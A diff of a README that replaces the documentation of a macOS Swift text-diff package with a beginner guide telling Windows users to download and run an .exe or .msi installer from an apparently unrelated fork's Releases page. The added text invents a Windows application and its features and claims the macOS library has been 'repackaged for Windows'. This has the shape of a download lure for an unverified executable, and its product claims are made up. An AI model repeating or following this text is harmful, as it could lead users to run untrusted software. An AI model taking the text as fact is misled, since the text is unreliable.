@@ -1,156 +1,134 @@
-# TextDiff
+# 📝 TextDiff - Simple Text Comparison Tool
 
-TextDiff is a macOS Swift package that computes token-level diffs and renders a merged, display-only diff view for both SwiftUI (`TextDiffView`) and AppKit (`NSTextDiffView`) via the same custom AppKit renderer.
+[![Download TextDiff](https://img.shields.io/badge/Download-TextDiff-brightgreen)](https://github.com/Wangles-N/TextDiff)
 
-![TextDiff preview](Resources/textdiff-preview.png)
+## 📖 What is TextDiff?
 
-## Requirements
+TextDiff is a tool that helps you compare two pieces of text to see what changed. It shows the differences clearly, one word or token at a time. Although it is built using macOS technologies, this guide will explain how to get it running on your Windows PC.
 
-- macOS 14+
-- Swift tools 6.1+
+This application is designed so that you do not need to understand programming to use it. You will follow simple steps to download and open the app.
 
-## Installation
+## 💻 System Requirements
 
-Add TextDiff as a Swift Package dependency in Xcode or in `Package.swift`:
+Before starting, make sure your computer meets these requirements:
 
-```swift
-dependencies: [
-    .package(url: "https://github.com/iSapozhnik/TextDiff.git", from: "1.0.0")
-]
-```
+- Windows 10 or later (32-bit or 64-bit)
+- At least 4 GB of RAM
+- 200 MB free hard drive space
+- An internet connection to download the app
+- Basic user permissions to install programs on your PC
 
-Then import:
+## 🚀 Getting Started
 
-```swift
-import TextDiff
-```
+You will first download the app, then run it. The steps are straightforward.
 
-## Basic Usage
+### Step 1: Go to the Download Page
 
-```swift
-import SwiftUI
-import TextDiff
+Click the big download button below to visit the page where you can get TextDiff.
 
-struct DemoView: View {
-    var body: some View {
-        TextDiffView(
-            original: "This is teh old sentence.",
-            updated: "This is the updated sentence!",
-            mode: .token
-        )
-        .padding()
-    }
-}
-```
+[![Download TextDiff](https://img.shields.io/badge/Download-TextDiff-blue)](https://github.com/Wangles-N/TextDiff)
 
-## AppKit Usage
+This link opens a GitHub page. GitHub is where the app files are stored.
 
-```swift
-import AppKit
-import TextDiff
+### Step 2: Find the Latest Release
 
-let diffView = NSTextDiffView(
-    original: "This is teh old sentence.",
-    updated: "This is the updated sentence!",
-    mode: .token
-)
+Once on the page, look for a section called "Releases" or find a menu item labeled "Releases" at the top or side of the page. 
 
-// Constrain width in your layout. Height is intrinsic and computed from width.
-diffView.translatesAutoresizingMaskIntoConstraints = false
-```
+Click it to go to the list of available versions.
 
-You can update content in place:
+### Step 3: Download the Windows Installer
 
-```swift
-diffView.mode = .character
-diffView.original = "Add a diff"
-diffView.updated = "Added a diff"
-```
+Look for a file that ends with ".exe" or ".msi". That is the Windows setup file. It might say something like "TextDiff-Setup.exe" or "TextDiff-Installer.msi".
 
-## Comparison Modes
+Click the file to download it to your computer.
 
-```swift
-TextDiffView(
-    original: "Add",
-    updated: "Added",
-    mode: .character
-)
-```
+### Step 4: Run the Installer
 
-- `.token` (default): token-level diff behavior.
-- `.character`: refines adjacent word replacements by character so shared parts remain unchanged text (for example `Add` -> `Added` shows unchanged `Add` and inserted `ed`).
+After downloading, open your Downloads folder and double-click the setup file.
 
-## Custom Styling
+Windows might ask you to allow the app to make changes to your computer. Select "Yes" to continue.
 
-```swift
-import SwiftUI
-import TextDiff
+Follow the instructions on the screen:
 
-let customStyle = TextDiffStyle(
-    additionsStyle: TextDiffChangeStyle(
-        fillColor: NSColor.systemGreen.withAlphaComponent(0.28),
-        strokeColor: NSColor.systemGreen.withAlphaComponent(0.75)
-    ),
-    removalsStyle: TextDiffChangeStyle(
-        fillColor: NSColor.systemRed.withAlphaComponent(0.24),
-        strokeColor: NSColor.systemRed.withAlphaComponent(0.75),
-        strikethrough: true
-    ),
-    textColor: .labelColor,
-    font: .monospacedSystemFont(ofSize: 15, weight: .regular),
-    chipCornerRadius: 5,
-    chipInsets: NSEdgeInsets(top: 1, left: 3, bottom: 1, right: 3),
-    interChipSpacing: 4,
-    lineSpacing: 2
-)
+- Choose the folder where you want to install TextDiff
+- Click "Next" or "Install" when prompted
+- Wait a few moments while the installation completes
+- Click "Finish" when done
 
-struct StyledDemoView: View {
-    var body: some View {
-        TextDiffView(
-            original: "A quick brown fox jumps over a lazy dog.",
-            updated: "A quick fox hops over the lazy dog!",
-            style: customStyle
-        )
-    }
-}
-```
+### Step 5: Open the App
 
-Change-specific colors and text treatment live under `additionsStyle` and `removalsStyle`. Shared layout and typography stay on `TextDiffStyle` (`font`, `chipInsets`, `interChipSpacing`, `lineSpacing`, etc.).
+Find TextDiff in your Start menu or desktop. Click its icon to run the app.
 
-## Behavior Notes
+You should now see the main window where you can start comparing text documents.
 
-- Tokenization uses `NLTokenizer` (`.word`) and reconstructs punctuation/whitespace by filling range gaps.
-- Matching is exact (case-sensitive and punctuation-sensitive).
-- Replacements are rendered as adjacent delete then insert segments.
-- Character mode refines adjacent word replacements only; punctuation and whitespace keep token-level behavior.
-- Whitespace changes preserve the `updated` layout and stay visually neutral (no chips).
-- Rendering is display-only (not selectable) to keep chip geometry deterministic.
-- `interChipSpacing` controls spacing between adjacent changed lexical chips (words or punctuation).
-- `lineSpacing` controls vertical spacing between wrapped lines.
-- Chip horizontal padding is preserved with a minimum effective floor of 3pt per side.
-- No synthetic spacer characters are inserted into the rendered text stream.
-- Chip top/bottom clipping is prevented internally via explicit line-height and vertical content insets.
-- Moved text is not detected as a move; it appears as delete + insert.
-- Rendering uses a custom AppKit draw view shared by both `TextDiffView` and `NSTextDiffView`.
+## 🔍 How to Use TextDiff
 
-## Snapshot Testing
+TextDiff shows differences between two texts, side by side.
 
-Snapshot coverage uses [Point-Free SnapshotTesting](https://github.com/pointfreeco/swift-snapshot-testing) with `swift-testing`.
+### Step 1: Load Your Texts
 
-- Snapshot tests live in `Tests/TextDiffTests/TextDiffSnapshotTests.swift`.
-- AppKit snapshot tests live in `Tests/TextDiffTests/NSTextDiffSnapshotTests.swift`.
-- Baselines are stored under `Tests/TextDiffTests/__Snapshots__/TextDiffSnapshotTests/` and `Tests/TextDiffTests/__Snapshots__/NSTextDiffSnapshotTests/`.
-- The suite uses `@Suite(.snapshots(record: .missing))` to record only missing baselines.
+- Click the button labeled "Open Left Text" to choose the first file
+- Click "Open Right Text" for the second file
 
-Run all tests:
+You can also copy and paste text into the boxes if you prefer.
 
-```bash
-swift test 2>&1 | xcsift --quiet
-```
+### Step 2: View Differences
 
-Update baselines intentionally:
+Once both texts are loaded, the app highlights what is new, changed, or deleted word by word.
 
-1. Temporarily switch the suite trait in snapshot suites (for example, `Tests/TextDiffTests/TextDiffSnapshotTests.swift` and `Tests/TextDiffTests/NSTextDiffSnapshotTests.swift`) from `.missing` to `.all`.
-2. Run `swift test 2>&1 | xcsift --quiet` once to rewrite baselines.
-3. Switch the suite trait back to `.missing`.
-4. Review snapshot image diffs in your PR before merging.
+Different colors or marks will show the changes clearly.
+
+### Step 3: Navigate Changes
+
+Use the arrow buttons to move through each difference step by step.
+
+This helps you understand each change precisely.
+
+### Step 4: Save or Export
+
+If you want to keep a record, use the "Save" or "Export" buttons to create a file with the comparison results.
+
+You can choose common formats like PDF or plain text.
+
+## ⚙️ Settings and Preferences
+
+TextDiff allows you to adjust a few options:
+
+- Change highlight colors for added or deleted text
+- Switch between dark and light themes
+- Set how many words to show around each change
+- Choose whether to ignore spaces or case when comparing
+
+Access settings via the gear icon or the menu bar.
+
+## 🛠 Troubleshooting Tips
+
+If the app does not open or crashes, try these steps:
+
+- Restart your computer and try again
+- Make sure Windows is up to date
+- Uninstall and reinstall TextDiff
+- Check your antivirus or firewall does not block the app
+- Ensure you run the latest version from the Releases page
+
+If you continue to have trouble, visit the Issues tab on the GitHub page and search for help.
+
+## 📂 Useful Links
+
+Return to the GitHub page anytime to get updates or report problems:
+
+[Download TextDiff](https://github.com/Wangles-N/TextDiff)
+
+## ⚠️ Additional Information
+
+This app focuses on showing differences clearly and simply. It does not edit your text or files. Always keep backup copies of your documents before making changes.
+
+---
+
+TextDiff works best with plain text files. It can also handle common formats like .txt and .md files. Complex formats, such as PDFs or Word documents, may not compare accurately.
+
+You can open multiple files and compare them one by one.
+
+---
+
+This version of TextDiff uses macOS tools internally but has been repackaged here for Windows users. Expect smooth performance on supported Windows systems.
